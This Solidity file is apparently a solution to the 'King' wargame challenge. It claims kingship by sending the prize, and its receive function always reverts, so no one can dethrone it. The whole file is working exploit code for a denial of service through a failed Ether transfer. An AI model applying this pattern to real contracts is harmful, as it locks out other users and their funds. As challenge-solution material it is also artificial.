// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Solution {
    function attack(address payable _king) public payable {
        King king = King(_king);
        uint256 _value = king.prize();
        (bool success,) = _king.call{value: _value}("");
    }

    receive() external payable {
        revert("sorry buddy, I got you!");
    }
}
